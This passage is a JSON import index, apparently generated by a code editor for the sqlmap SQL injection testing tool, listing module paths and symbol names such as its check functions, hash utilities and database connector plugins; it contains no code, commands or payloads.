        "detail": "thirdparty.six.moves",
        "documentation": {}
    },
    {
        "label": "urllib",
        "importPath": "thirdparty.six.moves",
        "description": "thirdparty.six.moves",
        "isExtraImport": true,
        "detail": "thirdparty.six.moves",
        "documentation": {}
    },
    {
        "label": "urllib",
        "importPath": "thirdparty.six.moves",
        "description": "thirdparty.six.moves",
        "isExtraImport": true,
        "detail": "thirdparty.six.moves",
        "documentation": {}
    },
    {
        "label": "http_client",
        "importPath": "thirdparty.six.moves",
        "description": "thirdparty.six.moves",
        "isExtraImport": true,
        "detail": "thirdparty.six.moves",
        "documentation": {}
    },
    {
        "label": "urllib",
        "importPath": "thirdparty.six.moves",
        "description": "thirdparty.six.moves",
        "isExtraImport": true,
        "detail": "thirdparty.six.moves",
        "documentation": {}
    },
    {
        "label": "http_client",
        "importPath": "thirdparty.six.moves",
        "description": "thirdparty.six.moves",
        "isExtraImport": true,
        "detail": "thirdparty.six.moves",
        "documentation": {}
    },
    {
        "label": "urllib",
        "importPath": "thirdparty.six.moves",
        "description": "thirdparty.six.moves",
        "isExtraImport": true,
        "detail": "thirdparty.six.moves",
        "documentation": {}
    },
    {
        "label": "urllib",
        "importPath": "thirdparty.six.moves",
        "description": "thirdparty.six.moves",
        "isExtraImport": true,
        "detail": "thirdparty.six.moves",
        "documentation": {}
    },
    {
        "label": "http_client",
        "importPath": "thirdparty.six.moves",
        "description": "thirdparty.six.moves",
        "isExtraImport": true,
        "detail": "thirdparty.six.moves",
        "documentation": {}
    },
    {
        "label": "urllib",
        "importPath": "thirdparty.six.moves",
        "description": "thirdparty.six.moves",
        "isExtraImport": true,
        "detail": "thirdparty.six.moves",
        "documentation": {}
    },
    {
        "label": "urllib",
        "importPath": "thirdparty.six.moves",
        "description": "thirdparty.six.moves",
        "isExtraImport": true,
        "detail": "thirdparty.six.moves",
        "documentation": {}
    },
    {
        "label": "urllib",
        "importPath": "thirdparty.six.moves",
        "description": "thirdparty.six.moves",
        "isExtraImport": true,
        "detail": "thirdparty.six.moves",
        "documentation": {}
    },
    {
        "label": "input",
        "importPath": "thirdparty.six.moves",
        "description": "thirdparty.six.moves",
        "isExtraImport": true,
        "detail": "thirdparty.six.moves",
        "documentation": {}
    },
    {
        "label": "urllib",
        "importPath": "thirdparty.six.moves",
        "description": "thirdparty.six.moves",
        "isExtraImport": true,
        "detail": "thirdparty.six.moves",
        "documentation": {}
    },
    {
        "label": "http_client",
        "importPath": "thirdparty.six.moves",
        "description": "thirdparty.six.moves",
        "isExtraImport": true,
        "detail": "thirdparty.six.moves",
        "documentation": {}
    },
    {
        "label": "input",
        "importPath": "thirdparty.six.moves",
        "description": "thirdparty.six.moves",
        "isExtraImport": true,
        "detail": "thirdparty.six.moves",
        "documentation": {}
    },
    {
        "label": "urllib",
        "importPath": "thirdparty.six.moves",
        "description": "thirdparty.six.moves",
        "isExtraImport": true,
        "detail": "thirdparty.six.moves",
        "documentation": {}
    },
    {
        "label": "http_client",
        "importPath": "thirdparty.six.moves",
        "description": "thirdparty.six.moves",
        "isExtraImport": true,
        "detail": "thirdparty.six.moves",
        "documentation": {}
    },
    {
        "label": "urllib",
        "importPath": "thirdparty.six.moves",
        "description": "thirdparty.six.moves",
        "isExtraImport": true,
        "detail": "thirdparty.six.moves",
        "documentation": {}
    },
    {
        "label": "BaseHTTPServer",
        "importPath": "thirdparty.six.moves",
        "description": "thirdparty.six.moves",
        "isExtraImport": true,
        "detail": "thirdparty.six.moves",
        "documentation": {}
    },
    {
        "label": "http_client",
        "importPath": "thirdparty.six.moves",
        "description": "thirdparty.six.moves",
        "isExtraImport": true,
        "detail": "thirdparty.six.moves",
        "documentation": {}
    },
    {
        "label": "queue",
        "importPath": "thirdparty.six.moves",
        "description": "thirdparty.six.moves",
        "isExtraImport": true,
        "detail": "thirdparty.six.moves",
        "documentation": {}
    },
    {
        "label": "BaseHTTPServer",
        "importPath": "thirdparty.six.moves",
        "description": "thirdparty.six.moves",
        "isExtraImport": true,
        "detail": "thirdparty.six.moves",
        "documentation": {}
    },
    {
        "label": "http_client",
        "importPath": "thirdparty.six.moves",
        "description": "thirdparty.six.moves",
        "isExtraImport": true,
        "detail": "thirdparty.six.moves",
        "documentation": {}
    },
    {
        "label": "socketserver",
        "importPath": "thirdparty.six.moves",
        "description": "thirdparty.six.moves",
        "isExtraImport": true,
        "detail": "thirdparty.six.moves",
        "documentation": {}
    },
    {
        "label": "urllib",
        "importPath": "thirdparty.six.moves",
        "description": "thirdparty.six.moves",
        "isExtraImport": true,
        "detail": "thirdparty.six.moves",
        "documentation": {}
    },
    {
        "label": "http_client",
        "importPath": "thirdparty.six.moves",
        "description": "thirdparty.six.moves",
        "isExtraImport": true,
        "detail": "thirdparty.six.moves",
        "documentation": {}
    },
    {
        "label": "urllib",
        "importPath": "thirdparty.six.moves",
        "description": "thirdparty.six.moves",
        "isExtraImport": true,
        "detail": "thirdparty.six.moves",
        "documentation": {}
    },
    {
        "label": "zip",
        "importPath": "thirdparty.six.moves",
        "description": "thirdparty.six.moves",
        "isExtraImport": true,
        "detail": "thirdparty.six.moves",
        "documentation": {}
    },
    {
        "label": "zip",
        "importPath": "thirdparty.six.moves",
        "description": "thirdparty.six.moves",
        "isExtraImport": true,
        "detail": "thirdparty.six.moves",
        "documentation": {}
    },
    {
        "label": "input",
        "importPath": "thirdparty.six.moves",
        "description": "thirdparty.six.moves",
        "isExtraImport": true,
        "detail": "thirdparty.six.moves",
        "documentation": {}
    },
    {
        "label": "zip",
        "importPath": "thirdparty.six.moves",
        "description": "thirdparty.six.moves",
        "isExtraImport": true,
        "detail": "thirdparty.six.moves",
        "documentation": {}
    },
    {
        "label": "zip",
        "importPath": "thirdparty.six.moves",
        "description": "thirdparty.six.moves",
        "isExtraImport": true,
        "detail": "thirdparty.six.moves",
        "documentation": {}
    },
    {
        "label": "urllib",
        "importPath": "thirdparty.six.moves",
        "description": "thirdparty.six.moves",
        "isExtraImport": true,
        "detail": "thirdparty.six.moves",
        "documentation": {}
    },
    {
        "label": "action",
        "importPath": "lib.controller.action",
        "description": "lib.controller.action",
        "isExtraImport": true,
        "detail": "lib.controller.action",
        "documentation": {}
    },
    {
        "label": "lib.controller.checks",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "lib.controller.checks",
        "description": "lib.controller.checks",
        "detail": "lib.controller.checks",
        "documentation": {}
    },
    {
        "label": "checkConnection",
        "importPath": "lib.controller.checks",
        "description": "lib.controller.checks",
        "isExtraImport": true,
        "detail": "lib.controller.checks",
        "documentation": {}
    },
    {
        "label": "checkDynParam",
        "importPath": "lib.controller.checks",
        "description": "lib.controller.checks",
        "isExtraImport": true,
        "detail": "lib.controller.checks",
        "documentation": {}
    },
    {
        "label": "checkInternet",
        "importPath": "lib.controller.checks",
        "description": "lib.controller.checks",
        "isExtraImport": true,
        "detail": "lib.controller.checks",
        "documentation": {}
    },
    {
        "label": "checkNullConnection",
        "importPath": "lib.controller.checks",
        "description": "lib.controller.checks",
        "isExtraImport": true,
        "detail": "lib.controller.checks",
        "documentation": {}
    },
    {
        "label": "checkSqlInjection",
        "importPath": "lib.controller.checks",
        "description": "lib.controller.checks",
        "isExtraImport": true,
        "detail": "lib.controller.checks",
        "documentation": {}
    },
    {
        "label": "checkStability",
        "importPath": "lib.controller.checks",
        "description": "lib.controller.checks",
        "isExtraImport": true,
        "detail": "lib.controller.checks",
        "documentation": {}
    },
    {
        "label": "checkWaf",
        "importPath": "lib.controller.checks",
        "description": "lib.controller.checks",
        "isExtraImport": true,
        "detail": "lib.controller.checks",
        "documentation": {}
    },
    {
        "label": "heuristicCheckSqlInjection",
        "importPath": "lib.controller.checks",
        "description": "lib.controller.checks",
        "isExtraImport": true,
        "detail": "lib.controller.checks",
        "documentation": {}
    },
    {
        "label": "checkConnection",
        "importPath": "lib.controller.checks",
        "description": "lib.controller.checks",
        "isExtraImport": true,
        "detail": "lib.controller.checks",
        "documentation": {}
    },
    {
        "label": "initTargetEnv",
        "importPath": "lib.core.target",
        "description": "lib.core.target",
        "isExtraImport": true,
        "detail": "lib.core.target",
        "documentation": {}
    },
    {
        "label": "setupTargetEnv",
        "importPath": "lib.core.target",
        "description": "lib.core.target",
        "isExtraImport": true,
        "detail": "lib.core.target",
        "documentation": {}
    },
    {
        "label": "crackHashFile",
        "importPath": "lib.utils.hash",
        "description": "lib.utils.hash",
        "isExtraImport": true,
        "detail": "lib.utils.hash",
        "documentation": {}
    },
    {
        "label": "attackDumpedTable",
        "importPath": "lib.utils.hash",
        "description": "lib.utils.hash",
        "isExtraImport": true,
        "detail": "lib.utils.hash",
        "documentation": {}
    },
    {
        "label": "attackCachedUsersPasswords",
        "importPath": "lib.utils.hash",
        "description": "lib.utils.hash",
        "isExtraImport": true,
        "detail": "lib.utils.hash",
        "documentation": {}
    },
    {
        "label": "storeHashesToFile",
        "importPath": "lib.utils.hash",
        "description": "lib.utils.hash",
        "isExtraImport": true,
        "detail": "lib.utils.hash",
        "documentation": {}
    },
    {
        "label": "lib.utils.sqlalchemy",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "lib.utils.sqlalchemy",
        "description": "lib.utils.sqlalchemy",
        "detail": "lib.utils.sqlalchemy",
        "documentation": {}
    },
    {
        "label": "SQLAlchemy",
        "importPath": "lib.utils.sqlalchemy",
        "description": "lib.utils.sqlalchemy",
        "isExtraImport": true,
        "detail": "lib.utils.sqlalchemy",
        "documentation": {}
    },
    {
        "label": "_sqlalchemy",
        "importPath": "lib.utils.sqlalchemy",
        "description": "lib.utils.sqlalchemy",
        "isExtraImport": true,
        "detail": "lib.utils.sqlalchemy",
        "documentation": {}
    },
    {
        "label": "Connector",
        "importPath": "plugins.dbms.access.connector",
        "description": "plugins.dbms.access.connector",
        "isExtraImport": true,
        "detail": "plugins.dbms.access.connector",
        "documentation": {}
    },
    {
        "label": "AccessMap",
        "importPath": "plugins.dbms.access",
        "description": "plugins.dbms.access",
        "isExtraImport": true,
        "detail": "plugins.dbms.access",
        "documentation": {}
    },
    {
        "label": "Connector",
        "importPath": "plugins.dbms.altibase.connector",
        "description": "plugins.dbms.altibase.connector",
        "isExtraImport": true,
        "detail": "plugins.dbms.altibase.connector",
        "documentation": {}
    },
    {
        "label": "AltibaseMap",
        "importPath": "plugins.dbms.altibase",
        "description": "plugins.dbms.altibase",
        "isExtraImport": true,
        "detail": "plugins.dbms.altibase",
        "documentation": {}
    },
    {
        "label": "Connector",
        "importPath": "plugins.dbms.cache.connector",
        "description": "plugins.dbms.cache.connector",
        "isExtraImport": true,
        "detail": "plugins.dbms.cache.connector",
        "documentation": {}
    },
    {
        "label": "CacheMap",
        "importPath": "plugins.dbms.cache",
        "description": "plugins.dbms.cache",
        "isExtraImport": true,
        "detail": "plugins.dbms.cache",
        "documentation": {}
    },
    {
        "label": "Connector",
        "importPath": "plugins.dbms.cratedb.connector",
        "description": "plugins.dbms.cratedb.connector",
        "isExtraImport": true,
        "detail": "plugins.dbms.cratedb.connector",
        "documentation": {}
    },
    {
        "label": "CrateDBMap",
        "importPath": "plugins.dbms.cratedb",
        "description": "plugins.dbms.cratedb",
        "isExtraImport": true,
        "detail": "plugins.dbms.cratedb",
        "documentation": {}
    },
    {
        "label": "Connector",
        "importPath": "plugins.dbms.cubrid.connector",
        "description": "plugins.dbms.cubrid.connector",
        "isExtraImport": true,
        "detail": "plugins.dbms.cubrid.connector",
        "documentation": {}
    },
    {
        "label": "CubridMap",
        "importPath": "plugins.dbms.cubrid",
        "description": "plugins.dbms.cubrid",
        "isExtraImport": true,
        "detail": "plugins.dbms.cubrid",
        "documentation": {}
    },
    {
        "label": "Connector",
        "importPath": "plugins.dbms.db2.connector",
        "description": "plugins.dbms.db2.connector",
        "isExtraImport": true,
        "detail": "plugins.dbms.db2.connector",
        "documentation": {}
    },
    {
        "label": "DB2Map",
        "importPath": "plugins.dbms.db2",
        "description": "plugins.dbms.db2",
        "isExtraImport": true,
        "detail": "plugins.dbms.db2",
        "documentation": {}
    },
    {
        "label": "Connector",
        "importPath": "plugins.dbms.derby.connector",
        "description": "plugins.dbms.derby.connector",
        "isExtraImport": true,
        "detail": "plugins.dbms.derby.connector",
        "documentation": {}
    },
    {
        "label": "DerbyMap",
        "importPath": "plugins.dbms.derby",
        "description": "plugins.dbms.derby",
        "isExtraImport": true,
        "detail": "plugins.dbms.derby",
        "documentation": {}
    },
    {
        "label": "Connector",
        "importPath": "plugins.dbms.extremedb.connector",
        "description": "plugins.dbms.extremedb.connector",
        "isExtraImport": true,
        "detail": "plugins.dbms.extremedb.connector",
        "documentation": {}
    },
    {
        "label": "ExtremeDBMap",
        "importPath": "plugins.dbms.extremedb",
        "description": "plugins.dbms.extremedb",
        "isExtraImport": true,
        "detail": "plugins.dbms.extremedb",
        "documentation": {}
    },
    {
        "label": "Connector",
        "importPath": "plugins.dbms.firebird.connector",
        "description": "plugins.dbms.firebird.connector",
        "isExtraImport": true,
        "detail": "plugins.dbms.firebird.connector",
        "documentation": {}
    },
    {
        "label": "FirebirdMap",
        "importPath": "plugins.dbms.firebird",
        "description": "plugins.dbms.firebird",
        "isExtraImport": true,
        "detail": "plugins.dbms.firebird",
        "documentation": {}
    },
    {
        "label": "Connector",
        "importPath": "plugins.dbms.frontbase.connector",
        "description": "plugins.dbms.frontbase.connector",
        "isExtraImport": true,
        "detail": "plugins.dbms.frontbase.connector",
        "documentation": {}
    },
    {
        "label": "FrontBaseMap",
        "importPath": "plugins.dbms.frontbase",
        "description": "plugins.dbms.frontbase",
        "isExtraImport": true,
        "detail": "plugins.dbms.frontbase",
        "documentation": {}
    },
    {
        "label": "Connector",
        "importPath": "plugins.dbms.h2.connector",
        "description": "plugins.dbms.h2.connector",
        "isExtraImport": true,
        "detail": "plugins.dbms.h2.connector",
        "documentation": {}
    },
    {
        "label": "H2Map",
        "importPath": "plugins.dbms.h2",
        "description": "plugins.dbms.h2",
        "isExtraImport": true,
        "detail": "plugins.dbms.h2",
        "documentation": {}
    },
    {
        "label": "Connector",
        "importPath": "plugins.dbms.hsqldb.connector",
        "description": "plugins.dbms.hsqldb.connector",
        "isExtraImport": true,
        "detail": "plugins.dbms.hsqldb.connector",
        "documentation": {}
    },
    {
        "label": "HSQLDBMap",
        "importPath": "plugins.dbms.hsqldb",
        "description": "plugins.dbms.hsqldb",
        "isExtraImport": true,
        "detail": "plugins.dbms.hsqldb",
        "documentation": {}
    },
    {
        "label": "Connector",
        "importPath": "plugins.dbms.informix.connector",
        "description": "plugins.dbms.informix.connector",
        "isExtraImport": true,
        "detail": "plugins.dbms.informix.connector",
        "documentation": {}
    },
    {
        "label": "InformixMap",
        "importPath": "plugins.dbms.informix",
        "description": "plugins.dbms.informix",
        "isExtraImport": true,
        "detail": "plugins.dbms.informix",
        "documentation": {}
    },
    {
        "label": "Connector",
        "importPath": "plugins.dbms.maxdb.connector",
        "description": "plugins.dbms.maxdb.connector",
        "isExtraImport": true,
        "detail": "plugins.dbms.maxdb.connector",
        "documentation": {}
    },
    {
        "label": "MaxDBMap",
        "importPath": "plugins.dbms.maxdb",
        "description": "plugins.dbms.maxdb",
        "isExtraImport": true,
        "detail": "plugins.dbms.maxdb",
        "documentation": {}
    },
    {
        "label": "Connector",
        "importPath": "plugins.dbms.mckoi.connector",
        "description": "plugins.dbms.mckoi.connector",
        "isExtraImport": true,
        "detail": "plugins.dbms.mckoi.connector",
        "documentation": {}
    },
    {
        "label": "MckoiMap",
        "importPath": "plugins.dbms.mckoi",
        "description": "plugins.dbms.mckoi",
        "isExtraImport": true,
        "detail": "plugins.dbms.mckoi",
        "documentation": {}
    },
    {
        "label": "Connector",
        "importPath": "plugins.dbms.mimersql.connector",
        "description": "plugins.dbms.mimersql.connector",
        "isExtraImport": true,
        "detail": "plugins.dbms.mimersql.connector",
        "documentation": {}
    },
    {
        "label": "MimerSQLMap",
        "importPath": "plugins.dbms.mimersql",
        "description": "plugins.dbms.mimersql",
        "isExtraImport": true,
        "detail": "plugins.dbms.mimersql",
        "documentation": {}
    },
    {
        "label": "Connector",
        "importPath": "plugins.dbms.monetdb.connector",
        "description": "plugins.dbms.monetdb.connector",
        "isExtraImport": true,
        "detail": "plugins.dbms.monetdb.connector",
        "documentation": {}
    },
    {
        "label": "MonetDBMap",
        "importPath": "plugins.dbms.monetdb",
        "description": "plugins.dbms.monetdb",
        "isExtraImport": true,
        "detail": "plugins.dbms.monetdb",
        "documentation": {}
    },
    {
        "label": "Connector",
        "importPath": "plugins.dbms.mssqlserver.connector",
        "description": "plugins.dbms.mssqlserver.connector",
        "isExtraImport": true,
        "detail": "plugins.dbms.mssqlserver.connector",
        "documentation": {}
    },
    {
        "label": "MSSQLServerMap",
        "importPath": "plugins.dbms.mssqlserver",
        "description": "plugins.dbms.mssqlserver",
        "isExtraImport": true,
        "detail": "plugins.dbms.mssqlserver",
        "documentation": {}
    },
    {
        "label": "Connector",
        "importPath": "plugins.dbms.mysql.connector",
        "description": "plugins.dbms.mysql.connector",
        "isExtraImport": true,
        "detail": "plugins.dbms.mysql.connector",
        "documentation": {}
    },
    {
        "label": "MySQLMap",
        "importPath": "plugins.dbms.mysql",
        "description": "plugins.dbms.mysql",
        "isExtraImport": true,
        "detail": "plugins.dbms.mysql",
        "documentation": {}
    },
    {
        "label": "Connector",
        "importPath": "plugins.dbms.oracle.connector",
        "description": "plugins.dbms.oracle.connector",
        "isExtraImport": true,
        "detail": "plugins.dbms.oracle.connector",
        "documentation": {}
    },
    {
        "label": "OracleMap",
        "importPath": "plugins.dbms.oracle",
        "description": "plugins.dbms.oracle",
        "isExtraImport": true,
        "detail": "plugins.dbms.oracle",
        "documentation": {}
    },
    {
        "label": "Connector",
        "importPath": "plugins.dbms.postgresql.connector",
        "description": "plugins.dbms.postgresql.connector",
        "isExtraImport": true,
        "detail": "plugins.dbms.postgresql.connector",
        "documentation": {}
    },
    {
        "label": "PostgreSQLMap",
        "importPath": "plugins.dbms.postgresql",
        "description": "plugins.dbms.postgresql",
        "isExtraImport": true,
        "detail": "plugins.dbms.postgresql",
        "documentation": {}
    },
    {
        "label": "Connector",
        "importPath": "plugins.dbms.presto.connector",
        "description": "plugins.dbms.presto.connector",
        "isExtraImport": true,
        "detail": "plugins.dbms.presto.connector",
        "documentation": {}
    },
    {
        "label": "PrestoMap",
        "importPath": "plugins.dbms.presto",
        "description": "plugins.dbms.presto",
        "isExtraImport": true,
        "detail": "plugins.dbms.presto",
        "documentation": {}
    },
    {
        "label": "Connector",
        "importPath": "plugins.dbms.raima.connector",
        "description": "plugins.dbms.raima.connector",
        "isExtraImport": true,
        "detail": "plugins.dbms.raima.connector",
        "documentation": {}
    },
    {
        "label": "RaimaMap",
        "importPath": "plugins.dbms.raima",
        "description": "plugins.dbms.raima",
        "isExtraImport": true,
        "detail": "plugins.dbms.raima",
        "documentation": {}
    },
    {
        "label": "Connector",
        "importPath": "plugins.dbms.sqlite.connector",
        "description": "plugins.dbms.sqlite.connector",
        "isExtraImport": true,
        "detail": "plugins.dbms.sqlite.connector",
        "documentation": {}
    },
    {
        "label": "SQLiteMap",
        "importPath": "plugins.dbms.sqlite",
        "description": "plugins.dbms.sqlite",
        "isExtraImport": true,
        "detail": "plugins.dbms.sqlite",
        "documentation": {}
    },
    {
        "label": "Connector",
        "importPath": "plugins.dbms.sybase.connector",
        "description": "plugins.dbms.sybase.connector",
        "isExtraImport": true,
        "detail": "plugins.dbms.sybase.connector",
        "documentation": {}
    },
    {
        "label": "SybaseMap",
        "importPath": "plugins.dbms.sybase",
        "description": "plugins.dbms.sybase",
        "isExtraImport": true,
        "detail": "plugins.dbms.sybase",
        "documentation": {}
    },
    {
        "label": "Connector",
        "importPath": "plugins.dbms.vertica.connector",
        "description": "plugins.dbms.vertica.connector",
        "isExtraImport": true,
        "detail": "plugins.dbms.vertica.connector",
        "documentation": {}
    },
    {
        "label": "VerticaMap",
        "importPath": "plugins.dbms.vertica",
        "description": "plugins.dbms.vertica",
        "isExtraImport": true,
        "detail": "plugins.dbms.vertica",
        "documentation": {}
    },
    {
        "label": "Connector",
        "importPath": "plugins.dbms.virtuoso.connector",
        "description": "plugins.dbms.virtuoso.connector",
        "isExtraImport": true,
        "detail": "plugins.dbms.virtuoso.connector",
        "documentation": {}
    },
    {
        "label": "VirtuosoMap",
        "importPath": "plugins.dbms.virtuoso",
        "description": "plugins.dbms.virtuoso",
        "isExtraImport": true,
        "detail": "plugins.dbms.virtuoso",
        "documentation": {}
    },
    {
        "label": "itertools",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "itertools",
        "description": "itertools",
        "detail": "itertools",
        "documentation": {}
    },
    {
        "label": "tempfile",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "tempfile",
        "description": "tempfile",
        "detail": "tempfile",
        "documentation": {}
    },
    {
        "label": "TemporaryFile",
        "importPath": "tempfile",
        "description": "tempfile",
        "isExtraImport": true,
        "detail": "tempfile",
        "documentation": {}
    },
    {
        "label": "binascii",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "binascii",
        "description": "binascii",
        "detail": "binascii",
        "documentation": {}
    },
    {
        "label": "codecs",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "codecs",
        "description": "codecs",
        "detail": "codecs",
        "documentation": {}
    },
    {
        "label": "lookup",
        "importPath": "codecs",
        "description": "codecs",
        "isExtraImport": true,
        "detail": "codecs",
        "documentation": {}
    },
    {
        "label": "register",
        "importPath": "codecs",
        "description": "codecs",
        "isExtraImport": true,
        "detail": "codecs",
        "documentation": {}
    },
    {
        "label": "contextlib",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "contextlib",
        "description": "contextlib",
        "detail": "contextlib",
        "documentation": {}
    },
    {
        "label": "functools",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "functools",
        "description": "functools",
        "detail": "functools",
        "documentation": {}
    },
    {
        "label": "wraps",
        "importPath": "functools",
        "description": "functools",
        "isExtraImport": true,
        "detail": "functools",
        "documentation": {}
    },
    {
        "label": "wraps",
        "importPath": "functools",
        "description": "functools",
        "isExtraImport": true,
        "detail": "functools",
        "documentation": {}
    },
    {
        "label": "getpass",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "getpass",
        "description": "getpass",
        "detail": "getpass",
        "documentation": {}
    },
    {
        "label": "hashlib",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "hashlib",
        "description": "hashlib",
        "detail": "hashlib",
        "documentation": {}
    },
    {
        "label": "md5",
        "importPath": "hashlib",
        "description": "hashlib",
        "isExtraImport": true,
        "detail": "hashlib",
        "documentation": {}
    },
    {
        "label": "sha1",
        "importPath": "hashlib",
        "description": "hashlib",
        "isExtraImport": true,
        "detail": "hashlib",
        "documentation": {}
    },
    {
        "label": "sha224",
        "importPath": "hashlib",
        "description": "hashlib",
        "isExtraImport": true,
        "detail": "hashlib",
        "documentation": {}
    },
    {
        "label": "sha256",
        "importPath": "hashlib",
        "description": "hashlib",
        "isExtraImport": true,
        "detail": "hashlib",
        "documentation": {}
    },
    {
        "label": "sha384",
        "importPath": "hashlib",
        "description": "hashlib",
        "isExtraImport": true,
        "detail": "hashlib",
        "documentation": {}
    },
    {
        "label": "sha512",
        "importPath": "hashlib",
        "description": "hashlib",
        "isExtraImport": true,
        "detail": "hashlib",
        "documentation": {}
    },
    {
        "label": "inspect",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "inspect",
        "description": "inspect",
        "detail": "inspect",
        "documentation": {}
    },
    {
        "label": "io",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "io",
        "description": "io",
        "detail": "io",
        "documentation": {}
    },
    {
        "label": "BytesIO",
        "importPath": "io",
        "description": "io",
        "isExtraImport": true,
        "detail": "io",
        "documentation": {}
    },
    {
        "label": "keyword",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "keyword",
        "description": "keyword",
        "detail": "keyword",
        "documentation": {}
    },
    {
        "label": "locale",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "locale",
        "description": "locale",
        "detail": "locale",
        "documentation": {}
    },
    {
        "label": "ntpath",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "ntpath",
        "description": "ntpath",
        "detail": "ntpath",
        "documentation": {}
    },
    {
        "label": "platform",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "platform",
        "description": "platform",
        "detail": "platform",
        "documentation": {}
    },
    {
        "label": "posixpath",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "posixpath",
        "description": "posixpath",
        "detail": "posixpath",
        "documentation": {}
    },
    {
        "label": "string",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "string",
        "description": "string",
        "detail": "string",
        "documentation": {}
    },
    {
        "label": "types",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "types",
        "description": "types",
        "detail": "types",
        "documentation": {}
    },
    {
        "label": "FunctionType",
        "importPath": "types",
        "description": "types",
        "isExtraImport": true,
        "detail": "types",
        "documentation": {}
    },
    {
        "label": "unicodedata",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "unicodedata",
        "description": "unicodedata",
        "detail": "unicodedata",
        "documentation": {}
    },
    {
        "label": "normalize",
        "importPath": "unicodedata",
        "description": "unicodedata",
        "isExtraImport": true,
        "detail": "unicodedata",
        "documentation": {}
    },
    {
        "label": "difflib",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "difflib",
        "description": "difflib",
        "detail": "difflib",
        "documentation": {}
    },
    {
        "label": "SequenceMatcher",
        "importPath": "difflib",
        "description": "difflib",
        "isExtraImport": true,
        "detail": "difflib",
        "documentation": {}
    },
    {
        "label": "math",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "math",
        "description": "math",
        "detail": "math",
        "documentation": {}
    },
    {
        "label": "sqrt",
        "importPath": "math",
        "description": "math",
        "isExtraImport": true,
        "detail": "math",
        "documentation": {}
    },
    {
        "label": "parse",
        "importPath": "xml.sax",
        "description": "xml.sax",
        "isExtraImport": true,
        "detail": "xml.sax",
        "documentation": {}
    },
    {
        "label": "SAXParseException",
        "importPath": "xml.sax",
        "description": "xml.sax",
        "isExtraImport": true,
        "detail": "xml.sax",
        "documentation": {}
    },
    {
        "label": "decloak",
        "importPath": "extra.cloak.cloak",
        "description": "extra.cloak.cloak",
        "isExtraImport": true,
        "detail": "extra.cloak.cloak",
        "documentation": {}
    },
    {
        "label": "cloak",
        "importPath": "extra.cloak.cloak",
        "description": "extra.cloak.cloak",
        "isExtraImport": true,
        "detail": "extra.cloak.cloak",
        "documentation": {}
    },
    {
        "label": "decloak",
        "importPath": "extra.cloak.cloak",
        "description": "extra.cloak.cloak",
        "isExtraImport": true,
        "detail": "extra.cloak.cloak",
        "documentation": {}
    },
    {
        "label": "decloak",
        "importPath": "extra.cloak.cloak",
        "description": "extra.cloak.cloak",
        "isExtraImport": true,
        "detail": "extra.cloak.cloak",
        "documentation": {}
    },
    {
        "label": "BigArray",
        "importPath": "lib.core.bigarray",
        "description": "lib.core.bigarray",
        "isExtraImport": true,
        "detail": "lib.core.bigarray",
        "documentation": {}
    },
    {
        "label": "BigArray",
        "importPath": "lib.core.bigarray",
        "description": "lib.core.bigarray",
        "isExtraImport": true,
        "detail": "lib.core.bigarray",
        "documentation": {}
    },
    {
        "label": "BigArray",
        "importPath": "lib.core.bigarray",
        "description": "lib.core.bigarray",
        "isExtraImport": true,
        "detail": "lib.core.bigarray",
        "documentation": {}
    },
    {
        "label": "BigArray",
        "importPath": "lib.core.bigarray",
        "description": "lib.core.bigarray",
        "isExtraImport": true,
        "detail": "lib.core.bigarray",
        "documentation": {}
    },
    {
        "label": "BigArray",
        "importPath": "lib.core.bigarray",
        "description": "lib.core.bigarray",
        "isExtraImport": true,
        "detail": "lib.core.bigarray",
        "documentation": {}
    },
    {
        "label": "BigArray",
        "importPath": "lib.core.bigarray",
        "description": "lib.core.bigarray",
        "isExtraImport": true,
        "detail": "lib.core.bigarray",
        "documentation": {}
    },
    {
        "label": "BigArray",
        "importPath": "lib.core.bigarray",
        "description": "lib.core.bigarray",
        "isExtraImport": true,
        "detail": "lib.core.bigarray",
        "documentation": {}
    },
    {
        "label": "BigArray",
        "importPath": "lib.core.bigarray",
        "description": "lib.core.bigarray",
        "isExtraImport": true,
        "detail": "lib.core.bigarray",
        "documentation": {}
    },
    {
        "label": "defaults",
        "importPath": "lib.core.defaults",
        "description": "lib.core.defaults",
        "isExtraImport": true,
        "detail": "lib.core.defaults",
        "documentation": {}
    },
    {
        "label": "defaults",
        "importPath": "lib.core.defaults",
        "description": "lib.core.defaults",
        "isExtraImport": true,
        "detail": "lib.core.defaults",
        "documentation": {}
    },
    {
        "label": "defaults",
        "importPath": "lib.core.defaults",
        "description": "lib.core.defaults",
        "isExtraImport": true,
        "detail": "lib.core.defaults",
        "documentation": {}
    },
    {
        "label": "defaults",
        "importPath": "lib.core.defaults",
        "description": "lib.core.defaults",
        "isExtraImport": true,
        "detail": "lib.core.defaults",
        "documentation": {}
    },
    {
        "label": "_defaults",
        "importPath": "lib.core.defaults",
        "description": "lib.core.defaults",
        "isExtraImport": true,
        "detail": "lib.core.defaults",
        "documentation": {}
    },
    {
        "label": "LOGGER_HANDLER",
        "importPath": "lib.core.log",
        "description": "lib.core.log",
        "isExtraImport": true,
        "detail": "lib.core.log",
        "documentation": {}
    },
    {
        "label": "LOGGER",
        "importPath": "lib.core.log",
        "description": "lib.core.log",
        "isExtraImport": true,
        "detail": "lib.core.log",
        "documentation": {}
    },
    {
        "label": "FORMATTER",
        "importPath": "lib.core.log",
        "description": "lib.core.log",
        "isExtraImport": true,
        "detail": "lib.core.log",
        "documentation": {}
    },
    {
        "label": "LOGGER_HANDLER",
        "importPath": "lib.core.log",
        "description": "lib.core.log",
        "isExtraImport": true,
